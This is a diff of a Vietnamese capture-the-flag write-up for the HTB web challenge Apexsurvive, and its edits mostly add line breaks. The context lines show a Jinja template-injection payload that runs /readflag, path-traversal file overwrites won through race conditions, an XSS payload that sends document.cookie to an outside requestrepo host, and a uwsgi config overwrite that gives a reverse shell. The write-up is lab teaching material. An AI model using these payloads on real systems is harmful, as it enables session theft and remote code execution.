@@ -10,7 +10,7 @@ Dạo này mình khá là hay viết wu các ctf challenge (chắc chắn không
 Lan man vậy cũng đủ rồi, sau đây sẽ là quá trình mình và các teamates trong KCSC đi giải các challenge web HTB, cũng như cách hiểu của mình về web chall đó. Let's go!!
 
 ## Apexsurvive 
-![image](https://hackmd.io/_uploads/BJWQ18b0p.png) 
+![image](https://hackmd.io/_uploads/BJWQ18b0p.png)<br> 
 ### Preface
 Đây là một chall white box nên mình download source về rồi dựng local khai thác cho nó tiện theo dõi, hehe :")))
 Sau khi dựng xong thì mình cũng phải khá choáng vì dockerfile của bài này những 70 dòng, nên mình tò mò đọc để nắm trước cần phải làm gì ở chall này
@@ -27,7 +27,7 @@ Docker như này là mình phải RCE để lấy flag rùi
 Chall có 2 service, 1 service web chính chạy python, và service email chạy js (và bot), nên mình nghĩ chắc sẽ có cả lỗ hổng client side và server side trong challenge này
 ### Verify email token
 Vào chall thì mình được 'hướng dẫn' đăng kí với tên `test@email.htb` và để nhận được token email verify, nên cũng nhanh nhảu register và nhận được token ở endpoint `/email` khi đã vào account settings và chọn verify:
-![image](https://hackmd.io/_uploads/HyQiJEmC6.png)
+![image](https://hackmd.io/_uploads/HyQiJEmC6.png)<br>
 Sau khi verify mình thấy có chức năng report và tham số truyền vào là ID của sản phẩm có tại `/challenge/home`(nghe mùi xss quá) 
 Đi vào đọc source, mình thấy có endpoint `/eternal` khá hay khi cho phép redirect đến endpoint mình control:
 ```python!
@@ -70,7 +70,7 @@ def addItem(decodedToken):
     return response('Something went wrong!')
 ```
 - Chức năng mình muốn nói đến thêm contract, khi upload 1 file lên, server lưu nội dung vào `/tmp/temporaryUpload` rồi mới check nội dung của file đó ở hàm checkPDF sử dụng PdfReader mode strict (khó cứu ca này). Nếu check thành công sẽ nối `/app/application`, `contracts` và file name bằng **os.path.join** để tạo thành file path hoàn chỉnh. Hàm **path.join** dính path traversal nặng và đây là lỗi mình cần khai thác để exploit path traversal upload file to RCE.
-![image](https://hackmd.io/_uploads/r1noqEQR6.png)
+<br>![image](https://hackmd.io/_uploads/r1noqEQR6.png)<br>
 ```python!
 @api.route('/addContract', methods=['POST'])
 @isAuthenticated
@@ -131,11 +131,11 @@ Server check pdf chặt nên mình sẽ gửi 1 pdf valid lấy mẫu request, v
 {% print(namespace.__init__.__globals__.os.popen('/readflag').read()) %}
 ```
 Thay đổi tên file của các file html thành `/app/application/templates/info.html`, mình gửi đi cùng lúc 1 req upload pdf và 6 req upload html
-![image](https://hackmd.io/_uploads/BJIR-rXRp.png)
+![image](https://hackmd.io/_uploads/BJIR-rXRp.png)<br>
 Sau một hồi spam Ctrl Space thì mình đã ghi đè được file info.html
-![image](https://hackmd.io/_uploads/SyOQfBmCp.png)
+![image](https://hackmd.io/_uploads/SyOQfBmCp.png)<br>
 Khai thác thành công!!
-![image](https://hackmd.io/_uploads/SJwvMBmAa.png)
+![image](https://hackmd.io/_uploads/SJwvMBmAa.png)<br>
 
 Tuy rằng đã có thể khai thác thành công, nhưng mình vẫn chưa tìm được cách nào để có thể lên được admin, cùng lúc này teammate [MacHongNam](https://hackmd.io/@machongnam) bảo mình hãy nghĩ cách để lên được **isInternal** nhằm sử dụng api /addItem, vì mình có thể dom based XSS tại endpoint /product/product-id
 ### Bypass sanitized input to trigger XSS
@@ -149,7 +149,7 @@ Nghe như vậy thì mình đã tìm đến path addProduct để thêm sản ph
 </script>
 ```
 Note là một thuộc tính mà mình control khi addProduct -> sử dụng  backtick escape khỏi đoạn khai báo note -> XSS:
-![image](https://hackmd.io/_uploads/BJfcIS7Ca.png)![image](https://hackmd.io/_uploads/rJKGwHQRa.png)
+![image](https://hackmd.io/_uploads/BJfcIS7Ca.png)<br>![image](https://hackmd.io/_uploads/rJKGwHQRa.png)<br>
 Kết hợp với việc có thể report cho admin về các product, mình có payload sau để lấy session của admin: 
 ```javascript!
 `;fetch("https://9vja3pan.requestrepo.com/?"+document.cookie);//
@@ -173,7 +173,7 @@ def verifyEmail(token):
     
     return False
 ```
-Ngặt nghèo ở chỗ là trang email của chúng ta chỉ nhận email gửi đến `test@email.htb` :cry:. Sau khi bế's tắc một khoảng thời gian khá lâu thì teammate [Chương](https://hackmd.io/@chuong) tìm ra được cách để nhận được email của tài khoản có hostname `apexsurvive.htb` là **race condition**:
+Ngặt nghèo ở chỗ là trang email của chúng ta chỉ nhận email gửi đến `test@email.htb` :cry:. Sau khi bế's tắc một khoảng thời gian khá lâu thì teammate [Chương](https://hackmd.io/@chuongcd) tìm ra được cách để nhận được email của tài khoản có hostname `apexsurvive.htb` là **race condition**:
 - Khi chỉnh sửa profile từ một email đã verify thành một email khác, server sẽ tự gửi token đến email đó
 ```python!
 @api.route('/profile', methods=['POST'])
@@ -210,19 +210,19 @@ Các bước tấn công đã đầy đủ, nên mình sẽ tổng hợp lại n
 Attack chain có tận 2 lần race condition nên việc có thể solve nhanh hay chậm nó phụ thuộc vào may mắn khá nhiều =)), sau khi rõ hướng thì mình deploy web rồi làm luôn và theo như mình thấy thì race verify email là công đoạn lâu nhất.
 - Bypass isInternal
 Mình tiếp tục sử dụng Burp Repeater để race condition email, với 3 req sendVerification, 1 req update profile test@email.htb và 1 req test@apexsurvive.htb:
-![image](https://hackmd.io/_uploads/HJaQ_L7R6.png)
+![image](https://hackmd.io/_uploads/HJaQ_L7R6.png)<br>
 Cuối cùng cũng có token có thể verify :cry:
-![image](https://hackmd.io/_uploads/rJd7c8QAa.png)
-![image](https://hackmd.io/_uploads/r1L4qLQAa.png)
+![image](https://hackmd.io/_uploads/rJd7c8QAa.png)<br>
+![image](https://hackmd.io/_uploads/r1L4qLQAa.png)<br>
 - Bypass admin
 Sử dụng payload bên trên và report product id, mình có admin token:
-![image](https://hackmd.io/_uploads/SJeAcLXCT.png)
-![image](https://hackmd.io/_uploads/SJSTiUXCT.png)
+![image](https://hackmd.io/_uploads/SJeAcLXCT.png)<br>
+![image](https://hackmd.io/_uploads/SJSTiUXCT.png)<br>
 Đến giờ truy cập admin để RCE rồi
-![image](https://hackmd.io/_uploads/HJJE3LX06.png)
+![image](https://hackmd.io/_uploads/HJJE3LX06.png)<br>
 - Upload file
 Mình làm y hệt như ở trên local và lụm được flag của challenge: 
-![image](https://hackmd.io/_uploads/rJ27AU7CT.png)
+![image](https://hackmd.io/_uploads/rJ27AU7CT.png)<br>
 - Flag: **HTB{0H_c0m3_0n_r4c3_c0nd1t10n_4nd_C55_1nj3ct10n_15_F1R3}**
 
 P/s: Sau khi làm xong mình mới thấy là nếu như render ra pdf thì trang web sẽ bị lỗi và không lưu lại template đó nên mình có thể tiếp tục race mà không phải redeploy challenge.
@@ -270,10 +270,10 @@ pdf.output('exploit.pdf', 'F')
 ```
 
 Sau khi gen ra PDF thì mình gửi đi để ghi đè `/app/uwsgi.ini`
-![image](https://hackmd.io/_uploads/ByNAHNrR6.png)
+![image](https://hackmd.io/_uploads/ByNAHNrR6.png)<br>
 Ghi đè tiếp `/app/application/database.py` để trigger `uwgsi` reload lại config
-![image](https://hackmd.io/_uploads/BJ0GU4BAT.png)
+![image](https://hackmd.io/_uploads/BJ0GU4BAT.png)<br>
 Log server thông báo việc file `database.py` đã bị thay đổi, tiến hành kill tiến trình và khởi động lại /app, load lại config
-![image](https://hackmd.io/_uploads/HJ4zLESRp.png)
+![image](https://hackmd.io/_uploads/HJ4zLESRp.png)<br>
 Reverse Shell thành công
-![image](https://hackmd.io/_uploads/SyS4L4H0p.png)
+<br>![image](https://hackmd.io/_uploads/SyS4L4H0p.png)<br>
